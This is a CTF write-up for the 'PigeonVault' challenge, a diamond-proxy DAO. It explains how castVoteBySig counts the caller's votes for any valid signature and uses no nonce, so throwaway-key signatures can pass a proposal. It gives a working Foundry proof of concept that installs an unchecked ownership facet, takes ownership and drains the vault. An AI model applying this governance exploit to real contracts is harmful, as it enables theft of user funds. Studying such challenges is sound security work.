# PigeonVault

## Challenge
We are provided with an abundance of contracts. Copying them all here wouldn't make sense, but they can all be found in the sources/repo. To keep it simple we have a diamond Proxy, which uses an ERC20 token for governance. There also is a DAO that can vote on proposals(changes of the functions/facets of the diamond proxy). Our goal is to steal all of the money from the proxy and also become its owner.

## Analysis 

As the codebase for this challenge was pretty huge, I decided to analyze the parts on their own first, to be able to use my notes afterward. At first, I decided to look at the facets, as these in the end contain the logic of the diamond contract.

### DAOFacet
- implements AppStorage
- includes functionality for creating & voting on proposals


### DiamondCutFacet
- does not implement AppStorage
- used for the diamondCut() function

### DiamondLoupeFacet
- does not implement AppStorage
- view only


### FTCFacet
- implements AppStorage
- token


### OwnershipFacet
- does not implement AppStorage
- only real function is to transfer the owner


### PigeonVaultFacet
- implements AppStorage
- probably the last step, has a function which lets you empty the contract if you are the owner


## Solution

The solution here lies in an issue in the voting system. When a vote is cast, multiple steps are happening:

1. Verify if the signer is an address other than 0
2. Verify if there already was a vote using this signature
3. Votes (as many as the msg.sender has delegated to him) are added to the chosen proposal
4. Signature is added to the list of already voted signers.

The problem is that the amount of tokens, that the msg.sender holds are added to the proposal, not the ones that the signer of the hash has. Also, there are no checks if msg.sender == signer. Additionally, as there are no nonces included in the msg that should be signed, one could reuse another user's signature that was used somewhere else. I found an interesting article that explains exactly how ecrecover works (https://soliditydeveloper.com/ecrecover). You can easily exploit this to pass any proposal you want using a few steps:

1. Generate Proposal
2. Delegate some votes to yourself
3. Generate arbitrary private keys
4. Sign the hash using them
5. Send these signatures as votes using your main account that holds voting rights
6. As each of these signatures results in a valid recovered address but is not in the list of the already voted you can do this x times.

But winning a proposal alone won't get you all the money. You will also need to become the owner and drain the money somehow. This leads to the final plan:

1. Call claim() on the setup contract to receive some tokens
2. Deploy your own OwnershipFacet which doesn't have any checks on who can change the owner
3. Delegate yourself the voting right for all your tokens
4. Build a Proposal that will add the function for changing the ownership you deployed earlier to the contract
5. Add the calldata for transferring the ownership to you to the proposal.
6. Wait 1 block 
7. Manipulate so your proposal has enough positive votes
8. Wait 6 blocks
9. Execute the proposal
10. Call emergencyWithdrawal() to get all the money.

So now I first had to develop the new OwnershipFacet(), which was pretty easy as I just removed functionality from the original one:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {LibDiamond} from "./libraries/LibDiamond.sol";

contract OwnershipFacetChanged{
    function transferOwnershipEZ(address _newOwner) external {
        LibDiamond.setContractOwner(_newOwner);
    }
}
```

I then used my [ParadigmCTFDebugTemplate](https://github.com/J4X-98/SolidityCTFToolkit/blob/main/forge/paradigmTester.sol) to build a POC which shows how to solve the challenge. 

```solidity
// Description:
// A forge testcase which you can use to easily debug challenges that were built using the Paradigm CTF framework.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
//Import all needed contracts here (they are usually stored in /src in your foundry directory)
import "../src/Setup.sol";
import "../src/interfaces/IDAOFacet.sol";
import "../src/interfaces/IDiamondCut.sol";
import "../src/interfaces/IERC20.sol";
import "../src/interfaces/IOwnershipFacet.sol";
import "../src/interfaces/IPigeonVaultFacet.sol";
import "../src/PigeonDiamond.sol";
import "../src/OwnershipFacetChanged.sol";


contract ParadigmTest is Test {
    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    //Initialize any additional needed variables here
    Setup public setupContract;

    function setUp() public {
        vm.deal(deployer, 3000 ether);
        vm.startPrank(deployer);

        //Copy all code from the Setup.sol constructor() function into here
        setupContract = new Setup{value: 3000 ether}();

        vm.stopPrank();
    }

    function test() public {
        //30 eth are the standard for the paradigm framework, but this could be configured differently, you can easily check this by importing the rpc url and private key into metamask and checking the balance of the deployer account
        vm.deal(attacker, 1 ether); 
        vm.startPrank(attacker);

        //Code your solution here
        PigeonDiamond diamond = PigeonDiamond(payable(address(setupContract.pigeonDiamond())));

        //Claim our 10k token
        setupContract.claim();
       
        //We deploy our own OwnershipFacet which doesn't check who can change the owner
        OwnershipFacetChanged newOwnership = new OwnershipFacetChanged();

        //We set ourselves as the delegate for our 10k token
        IERC20(address(diamond)).delegate(address(attacker));

        //Generate our FacetCut struct with the right address & Selectors
        bytes4[] memory functionSelectors = new bytes4[](1);
        functionSelectors[0] = OwnershipFacetChanged.transferOwnershipEZ.selector;
        IDiamondCut.FacetCut memory cut = IDiamondCut.FacetCut(address(newOwnership), IDiamondCut.FacetCutAction.Add, functionSelectors);
    
        //Generate the calldata so the owner directly gets switched
        bytes memory calldataOwnerChange = abi.encodeWithSelector(OwnershipFacetChanged.transferOwnershipEZ.selector, address(attacker));

        //We submit our proposal
        uint256 proposalId = IDAOFacet(address(diamond)).submitProposal(address(newOwnership), calldataOwnerChange, cut);

        //We wait one block
        vm.roll(block.number + 1);

        //Variable for creating the signature
        uint256 privateKeyAttacker = uint256(keccak256(abi.encodePacked("attacker")));
        bytes32 hash = keccak256("\x19Ethereum Signed Message:\n32");

        //First we vote for ourselves
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKeyAttacker, hash);
        bytes memory signature = abi.encodePacked(r, s, v); //v,r,s are in this order in the ecrecover
        IDAOFacet(address(diamond)).castVoteBySig(proposalId, true, signature);

        //We generate 15 private keys and sign a vote with each of them
        for (uint i = 1; i < 15; i++)
        {
            //Generate a valid signature 
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(i, hash);
            signature = abi.encodePacked(r, s, v);

            //Vote using this signature
            IDAOFacet(address(diamond)).castVoteBySig(proposalId, true, signature);
        }

        //We wait for 6 blocks to be able to execute the proposal
        vm.roll(block.number + 6);

        //We execute the proposal
        IDAOFacet(address(diamond)).executeProposal(proposalId);

        //We call the emergencyWithdraw() function
        IPigeonVaultFacet(address(diamond)).emergencyWithdraw();

        assertEq(setupContract.isSolved(), true);

        vm.stopPrank();
    }
}
```

